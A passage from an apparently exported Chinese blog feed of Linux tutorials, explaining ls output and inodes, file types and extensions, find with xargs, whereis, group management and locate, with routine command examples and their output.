第四列： 属主； 第五列：所归属的组； 第六列：文件或目录的大小； 第七列和第八列：最后访问或修改时间； 第九列：文件名或目录名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以 log2012.log 为例： 12095112 -rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件类型：文件类型是-，表示这是一个普通文件； 关于文件的类型，请参考：Linux文件类型与扩展名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件权限：文件权限是rw-r–r– ，表示文件属主可读、可写、不可执行，文件所归属的用户组不可写，可读，不可执行，其它用户不可写，可读，不可执行； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;硬链接个数： log2012.log这个文件没有硬链接；因为数值是1，就是他本身； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件属主：也就是这个文件归哪于哪个用户 ，它归于root，也就是第一个root； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件属组：也就是说，对于这个文件，它归属于哪个用户组，在这里是root用户组； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件大小：文件大小是296k个字节； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;访问可修改时间 ：这里的时间是最后访问的时间，最后访问和文件被修改或创建的时间，有时并不是一致的； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然文档的属性不仅仅包括这些，这些是我们最常用的一些属性。 关于 inode&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;inode 译成中文就是索引节点。每个存储设备或存储设备的分区（存储设备是硬盘、软盘、U盘等等）被格式化为文件系统后，应该有两部份，一部份是inode，另一部份是Block，Block是用来存储数据用的。而inode呢，就是用来存储这些数 据的信息，这些信息包括文件大小、属主、归属的用户组、读写权限等。inode为每个文件进行信息索引，所以就有了inode的数值。操作系统根据指令， 能通过inode值最快的找到相对应的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;做个比喻，比如一本书，存储设备或分区就相当于这本书，Block相当于书中的每一页，inode 就相当于这本书前面的目录，一本书有很多的内容，如果想查找某部份的内容，我们可以先查目录，通过目录能最快的找到我们想要看的内容。虽然不太恰当，但还是比较形象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当我们用ls 查看某个目录或文件时，如果加上-i 参数，就可以看到inode节点了；比如我们前面所说的例子： 12[root@localhost test]# ls -li log2012.log 2095112 -rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;log2012.log 的inode值是 2095112 ； 查看一个文件或目录的inode，要通过ls 命令的的 -i参数。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件类型与扩展名]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F24.%20Linux%20%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8E%E6%89%A9%E5%B1%95%E5%90%8D%2F</url>
    <content type="text"><![CDATA[Linux 文件类型与扩展名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux文件类型和Linux文件的文件名所代表的意义是两个不同的概念。我们通过一般应用程序而创建的比如file.txt、file.tar.gz ，这些文件虽然要用不同的程序来打开，但放在Linux文件类型中衡量的话，大多是常规文件（也被称为普通文件）。 一、文件类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux文件类型常见的有：普通文件、目录文件、字符设备文件和块设备文件、符号链接文件等，现在我们进行一个简要的说明。 1.普通文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们用 ls -lh 来查看某个文件的属性，可以看到有类似-rwxrwxrwx，值得注意的是第一个符号是 - ，这样的文件在Linux中就是普通文件。这些文件一般是用一些相关的应用程序创建，比如图像工具、文档工具、归档工具… …. 或 cp工具等。这类文件的删除方式是用rm 命令。 另外，依照文件的内容，又大略可以分为： 纯文本档（ASCII）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是Linux系统中最多的一种文件类型，称为纯文本档是因为内容为我们人类可以直接读到的数据，例如数字、字母等等。 几乎只要我们可以用来做为设定的文件都属于这一种文件类型。 举例来说，你可以用命令： cat ~/.bashrc 来看到该文件的内容。 (cat 是将一个文件内容读出来的指令). 二进制文件（binary）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统其实仅认识且可以执行二进制文件(binary file)。Linux当中的可执行文件(scripts, 文字型批处理文件不算)就是这种格式的文件。 刚刚使用的命令cat就是一个binary file。 数据格式化文件（data）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些程序在运作的过程当中会读取某些特定格式的文件，那些特定格式的文件可以被称为数据文件 (data file)。举例来说，我们的Linux在使用者登录时，都会将登录的数据记录在 /var/log/wtmp那个文件内，该文件是一个data file，他能够透过last这个指令读出来！ 但是使用cat时，会读出乱码～因为他是属于一种特殊格式的文件？ 2.目录文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当我们在某个目录下执行，看到有类似 drwxr-xr-x ，这样的文件就是目录，目录在Linux是一个比较特殊的文件。注意它的第一个字符是d。创建目录的命令可以用 mkdir 命令，或cp命令，cp可以把一个目录复制为另一个目录。删除用rm 或rmdir命令。 3.字符设备或块设备文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如时您进入/dev目录，列一下文件，会看到类似如下的: 1234[root@localhost ~]# ls -al /dev/ttycrw-rw-rw- 1 root tty 5, 0 11-03 15:11 /dev/tty[root@localhost ~]# ls -la /dev/sda1brw-r----- 1 root disk 8, 1 11-03 07:11 /dev/sda1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们看到/dev/tty的属性是 crw-rw-rw- ，注意前面第一个字符是 c ，这表示字符设备文件。比如猫等串口设备。我们看到 /dev/sda1 的属性是 brw-r—– ，注意前面的第一个字符是b，这表示块设备，比如硬盘，光驱等设备。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个种类的文件，是用mknode来创建，用rm来删除。目前在最新的Linux发行版本中，我们一般不用自己来创建设备文件。因为这些文件是和内核相关联的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;与系统周边及储存等相关的一些文件， 通常都集中在/dev这个目录之下！通常又分为两种： 区块（block）设备档&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就是一些储存数据， 以提供系统随机存取的接口设备，举例来说，硬盘与软盘等就是啦！ 你可以随机的在硬盘的不同区块读写，这种装置就是成组设备！你可以自行查一下/dev/sda看看， 会发现第一个属性为[ b ]！ 字符（character）设备文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;亦即是一些串行端口的接口设备， 例如键盘、鼠标等等！这些设备的特色就是一次性读取的，不能够截断输出。 举例来说，你不可能让鼠标跳到另一个画面，而是滑动到另一个地方！第一个属性为 [ c ]。 4.数据接口文件（sockets）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据接口文件（或者：套接口文件），这种类型的文件通常被用在网络上的数据承接了。我们可以启动一个程序来监听客户端的要求， 而客户端就可以透过这个socket来进行数据的沟通了。第一个属性为 [ s ]， 最常在/var/run这个目录中看到这种文件类型了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：当我们启动MySQL服务器时，会产生一个mysql.sock的文件。 12[root@localhost ~]# ls -lh /var/lib/mysql/mysql.sock srwxrwxrwx 1 mysql mysql 0 04-19 11:12 /var/lib/mysql/mysql.sock &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意这个文件的属性的第一个字符是 s。 5.符号连接文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当我们查看文件属性时，会看到有类似 lrwxrwxrwx,注意第一个字符是l，这类文件是链接文件。是通过ln -s 源文件名 新文件名 。上面是一个例子，表示setup.log是install.log的软链接文件。怎么理解呢？这和Windows操作系统中的快捷方式有点相似。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;符号链接文件的创建方法举例: 123456[root@localhost test]# ls -lh log2012.log-rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log[root@localhost test]# ln -s log2012.log linklog.log[root@localhost test]# ls -lh *.loglrwxrwxrwx 1 root root 11 11-22 06:58 linklog.log -&gt; log2012.log-rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log 6.数据传输文件（FIFO，pipe）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FIFO也是一种特殊的文件类型，他主要的目的在解决多个程序同时存取一个文件所造成的错误问题。 FIFO是first-in-first-out的缩写。第一个属性为[p] 。 二、Linux 文件扩展名1.扩展名类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上，Linux的文件是没有所谓的扩展名的，一个Linux文件能不能被执行，与他的第一栏的十个属性有关， 与档名根本一点关系也没有。这个观念跟Windows的情况不相同喔！在Windows底下， 能被执行的文件扩展名通常是 .com .exe .bat等等，而在Linux底下，只要你的权限当中具有x的话，例如[ -rwx-r-xr-x ] 即代表这个文件可以被执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过，可以被执行跟可以执行成功是不一样的～举例来说，在root家目录下的install.log 是一个纯文本档，如果经由修改权限成为 -rwxrwxrwx 后，这个文件能够真的执行成功吗？ 当然不行～因为他的内容根本就没有可以执行的数据。所以说，这个x代表这个文件具有可执行的能力， 但是能不能执行成功，当然就得要看该文件的内容. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虽然如此，不过我们仍然希望可以藉由扩展名来了解该文件是什么东西，所以，通常我们还是会以适当的扩展名来表示该文件是什么种类的。底下有数种常用的扩展名： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*.sh ： 脚本或批处理文件 (scripts)，因为批处理文件为使用shell写成的，所以扩展名就编成 .sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Z, .tar, .tar.gz, .zip, *.tgz： 经过打包的压缩文件。这是因为压缩软件分别为 gunzip, tar 等等的，由于不同的压缩软件，而取其相关的扩展名！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.html, .php：网页相关文件，分别代表 HTML 语法与 PHP 语法的网页文件。 .html 的文件可使用网页浏览器来直接开启，至于 .php 的文件， 则可以透过 client 端的浏览器来 server 端浏览，以得到运算后的网页结果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上，Linux系统上的文件名真的只是让你了解该文件可能的用途而已，真正的执行与否仍然需要权限的规范才行。例如虽然有一个文件为可执行文件，如常见的/bin/ls这个显示文件属性的指令，不过，如果这个文件的权限被修改成无法执行时，那么ls就变成不能执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上述的这种问题最常发生在文件传送的过程中。例如你在网络上下载一个可执行文件，但是偏偏在你的 Linux系统中就是无法执行！呵呵！那么就是可能文件的属性被改变了。不要怀疑，从网络上传送到你的 Linux系统中，文件的属性与权限确实是会被改变的。 2.Linux 文件名长度限制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux底下，使用预设的Ext2/Ext3文件系统时，针对文件名长度限制为： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;单一文件或目录的最大容许文件名为 255 个字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;包含完整路径名称及目录 (/) 之完整档名为 4096 个字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是相当长的档名！我们希望Linux的文件名可以一看就知道该文件在干嘛的， 所以档名通常是很长很长。 3.Linux 文件名的字符的限制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于Linux在文字接口下的一些指令操作关系，一般来说，你在设定Linux底下的文件名时， 最好可以避免一些特殊字符比较好！例如底下这些： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;* ? &gt; &lt; ; &amp; ! [ ] | \ ‘ “ ` ( ) { } &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为这些符号在文字接口下，是有特殊意义的。另外，文件名的开头为小数点“.”时， 代表这个文件为隐藏文件！同时，由于指令下达当中，常常会使用到 -option 之类的选项， 所以你最好也避免将文件档名的开头以 - 或 + 来命名。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find 命令之 xargs]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F21.%20find%20%E5%91%BD%E4%BB%A4%E4%B9%8B%20xargs%2F</url>
    <content type="text"><![CDATA[find 命令之 xargs&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在使用 find命令的-exec选项处理匹配到的文件时， find命令将所有匹配到的文件一起传递给exec执行。但有些系统对能够传递给exec的命令长度有限制，这样在find命令运行几分钟之后，就会出现溢出错误。错误信息通常是“参数列太长”或“参数列溢出”。这就是xargs命令的用处所在，特别是与find命令一起使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;find命令把匹配到的文件传递给xargs命令，而xargs命令每次只获取一部分文件而不是全部，不像-exec选项那样。这样它可以先处理最先获取的一部分文件，然后是下一批，并如此继续下去。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在有些系统中，使用-exec选项会为处理每一个匹配到的文件而发起一个相应的进程，并非将匹配到的文件全部作为参数一次执行；这样在有些情况下就会出现进程过多，系统性能下降的问题，因而效率不高； 而使用xargs命令则只有一个进程。另外，在使用xargs命令时，究竟是一次获取所有的参数，还是分批取得参数，以及每一次获取参数的数目都会根据该命令的选项及系统内核中相应的可调参数来确定。 使用实例实例1：查找系统中的每一个普通文件，然后使用 xargs 命令来测试他们分别属于哪类文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -print | xargs file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 0 11-12 22:25 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# find . -type f -print | xargs file./log2014.log: empty./log2013.log: empty./log2012.log: ASCII text[root@localhost test]# 实例2：在整个系统中查找内存信息转储文件（core dump），然后把结果保存到 /tmp/core.log 文件中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find / -name "core" -print | xargs echo "" &gt; /tmp/core.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost test]# find / -name "core" -print | xargs echo "" &gt;/tmp/core.log[root@localhost test]# cd /tmp[root@localhost tmp]# ll总计 16-rw-r--r-- 1 root root 1524 11-12 22:29 core.logdrwx------ 2 root root 4096 11-12 22:24 ssh-TzcZDx1766drwx------ 2 root root 4096 11-12 22:28 ssh-ykiRPk1815drwx------ 2 root root 4096 11-03 07:11 vmware-root 实例3：在当前目录下查找所有用户具有读、写和执行权限的文件，并收回相应的写权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -prem -7 -print | xargs chmod 0-w &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 0 11-12 22:25 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# find . -perm -7 -print | xargs chmod o-w[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 0 11-12 22:25 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 19:32 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行命令后，文件夹 scf 、test3 和 test4 的权限都发生改变 实例4：用 grep 命令在所有的普通文件中搜索 hostname 这个词&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -print | xargs grep "hostname" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# find . -type f -print | xargs grep "hostname"./log2013.log:hostnamebaidu=baidu.com./log2013.log:hostnamesina=sina.com./log2013.log:hostnames=true[root@localhost test]# 实例5：用 grep 命令在当前目录下的所有普通文件中搜索 hostnames 这个词&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name \* -type f -print | xargs grep "hostnames" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@peida test]# find . -name \* -type f -print | xargs grep "hostnames"./log2013.log:hostnamesina=sina.com./log2013.log:hostnames=true[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，在上例中， \ 用来取消 find 命令中的 * 在 shell 中的特殊含义。 实例6：使用 xargs 执行 mv1find . -name "*.log" | xargs -i mv &#123;&#125; test4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 61 11-12 22:44 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 22:54 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# cd test4/[root@localhost test4]# ll总计 0[root@localhost test4]# cd ..[root@localhost test]# find . -name "*.log" | xargs -i mv &#123;&#125; test4[root@localhost test]# ll总计 12drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 05:50 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# cd test4/[root@localhost test4]# ll总计 304-rw-r--r-- 1 root root 302108 11-12 22:54 log2012.log-rw-r--r-- 1 root root 61 11-12 22:54 log2013.log-rw-r--r-- 1 root root 0 11-12 22:54 log2014.log[root@localhost test4]# 实例7：find 后执行 xargs 提示 xargs：argument line too long 解决方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -atime +0 -print0 | xargs -0 -11 -t rm -f &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@pd test4]# find . -type f -atime +0 -print0 | xargs -0 -l1 -t rm -frm -f [root@pdtest4]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-11 是一次处理一个； -t 是处理之前打印出命令 实例8：使用 -i 参数默认的前面输出用 {} 代替， -I 参数可以指定其他代替字符，如例子中的 []&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "file" | xargs -I [] cp [] .. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021[root@localhost test]# ll总计 12drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 05:50 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# cd test4[root@localhost test4]# find . -name "file" | xargs -I [] cp [] ..[root@localhost test4]# ll总计 304-rw-r--r-- 1 root root 302108 11-12 22:54 log2012.log-rw-r--r-- 1 root root 61 11-12 22:54 log2013.log-rw-r--r-- 1 root root 0 11-12 22:54 log2014.log[root@localhost test4]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 05:50 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 -i 参数默认的前面输出用 {} 代替，-I 参数可以指定其他代替字符，如例子中的[] 实例9：xargs 的 -p 参数的使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" | xargs -p -i mv &#123;&#125; .. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627[root@localhost test3]# ll总计 0-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log[root@localhost test3]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:06 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# cd test3[root@localhost test3]# find . -name "*.log" | xargs -p -i mv &#123;&#125; ..mv ./log2015.log .. ?...y[root@localhost test3]# ll总计 0[root@localhost test3]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:08 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-p 参数会提示让你确认是否执行后面的命令，y 执行，n 不执行。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- whereis]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F17.%20Linux%20%E5%91%BD%E4%BB%A4-%20whereis%2F</url>
    <content type="text"><![CDATA[Linux 命令- whereis&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;whereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和find相比，whereis查找的速度非常快，这是因为linux系统会将 系统内的所有文件都记录在一个数据库文件中，当使用whereis和下面即将介绍的locate时，会从数据库中查找数据，而不是像find命令那样，通 过遍历硬盘来查找，效率自然会很高。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是该数据库文件并不是实时更新，默认情况下时一星期更新一次，因此，我们在用whereis和locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。 1.命令格式1whereis [-bmsu] [BMS 目录名 -f ] 文件名 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;whereis 命令是定位可执行文件、源代码文件、帮助文件在文件系统中的位置。这些文件的属性应属于原始代码，二进制文件，或是帮助文件。whereis 程序还具有搜索源代码、指定备用搜索路径和搜索不寻常项的能力。 3.命令参数 -b 定位可执行文件。 -m 定位帮助文件。 -s 定位源代码文件。 -u 搜索默认路径下除可执行文件、源代码文件、帮助文件以外的其它文件。 -B 指定搜索可执行文件的路径。 -M 指定搜索帮助文件的路径。 -S 指定搜索源代码文件的路径。 4.使用实例实例1：将和 ** 文件相关的文件都查找出来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1whereis svn &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# whereis tomcattomcat:[root@localhost ~]# whereis svnsvn: /usr/bin/svn /usr/local/svn /usr/share/man/man1/svn.1.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat 没安装，找不出来，svn 安装找出了很多相关文件 实例2：只将二进制文件查找出来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1whereis -b svn &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# whereis -b svnsvn: /usr/bin/svn /usr/local/svn[root@localhost ~]# whereis -m svnsvn: /usr/share/man/man1/svn.1.gz[root@localhost ~]# whereis -s svnsvn:[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;whereis -m svn 查出说明文档路径，whereis -s svn 找 source 源文件。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 增加和删除用户组]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F8.%20Linux%20%E5%A2%9E%E5%8A%A0%E5%92%8C%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%E7%BB%84%2F</url>
    <content type="text"><![CDATA[Linux 增加和删除用户组1.新增一个组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：groupadd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法： 1groupadd [-g GID] groupname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不加“-g”选项则按照系统默认的 gid 创建组，跟用户一样，gid 也是从 500 开始的。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例： 123[root@localhost ~]# groupadd grptest1[root@localhost ~]# tail -n1 /etc/groupgrptest1:x:502: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“-g”选项可以自定义 gid。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例： 1234[root@localhost ~]# groupadd -g 511 grptest2[root@localhost ~]# tail -n2 /etc/groupgrptest1:x:502:grptest2:x:511: 2.删除组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：groupdel 12345[root@localhost ~]# groupdel grptest2[root@localhost ~]# tail -n3 /etc/grouptestgroup:x:500:user1:x:501:grptest1:x:502: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该命令没有特殊选项，但有一种情况不能删除组： 12[root@localhost ~]# groupdel user1groupdel: cannot remove the primary group of user 'user1' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是因为 user1 组中包含 user1 账户，只有删除 user1 账户后才可以删除组。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- locate]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F18.%20Linux%20%E5%91%BD%E4%BB%A4-%20locate%2F</url>
    <content type="text"><![CDATA[Linux 命令- locate&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;locate 让使用者可以很快速的搜寻档案系统内是否有指定的档案。其方法是先建立一个包括系统内所有档案名称及路径的数据库，之后当寻找时就只需查询这个数据库，而不必实际深入档案系统之中了。在一般的 distribution 之中，数据库的建立都被放在 crontab 中自动执行。 1.命令格式1locate [选择参数] [样式] 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;locate命令可以在搜寻数据库时快速找到档案，数据库由updatedb程序来更新，updatedb是由cron daemon周期性建立的，locate命令在搜寻数据库时比由整个由硬盘资料来搜寻资料来得快，但较差劲的是locate所找到的档案若是最近才建立或 刚更名的，可能会找不到，在内定值中，updatedb每天会跑一次，可以由修改crontab来更新设定值。(etc/crontab) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;locate指定用在搜寻符合条件的档案，它会去储存档案与目录名称的数据库内，寻找合乎范本样式条件的档案或目录录，可以使用特殊字元（如”*” 或”?”等）来指定范本样式，如指定范本为kcpa*ner, locate会找出所有起始字串为kcpa且结尾为ner的档案或目录，如名称为kcpartner若目录录名称为kcpa_ner则会列出该目录下包括 子目录在内的所有档案。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;locate指令和find找寻档案的功能类似，但locate是透过update程序将硬盘中的所有档案和目录资料先建立一个索引数据库，在 执行loacte时直接找该索引，查询速度会较快，索引数据库一般是由操作系统管理，但也可以直接下达update强迫系统立即修改索引数据库。 命令参数 -e：将排除在寻找的范围之外。 -1：如果 是 1．则启动安全模式。在安全模式下，使用者不会看到权限无法看到 的档案。这会始速度减慢，因为 locate 必须至实际的档案系统中取得档案的 权限资料。 -f：将特定的档案系统排除在外，例如我们没有到理要把 proc 档案系统中的档案 放在资料库中。 -q：安静模式，不会显示任何错误讯息。 -n：至多显示 n个输出。 -r：使用正规运算式 做寻找的条件。 -o：指定资料库存的名称。 -d：指定资料库的路径 -h：显示辅助讯息 -V：显示程式的版本讯息 4.使用实例实例1：查找和 pwd 相关的所有文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1locate pwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516peida-VirtualBox ~ # locate 